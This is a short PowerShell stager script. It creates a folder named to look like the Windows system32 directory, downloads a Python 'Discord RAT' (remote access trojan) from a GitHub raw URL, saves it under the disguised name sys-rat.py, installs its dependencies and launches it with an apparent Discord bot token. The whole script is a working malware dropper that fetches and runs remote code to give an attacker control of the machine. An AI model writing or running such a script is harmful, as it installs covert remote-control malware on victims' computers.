mkdir 'C:\system32\'

cd C:\system32\

iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py

py -m pip install discord.py requests -u

Python sys-rat.py $dc
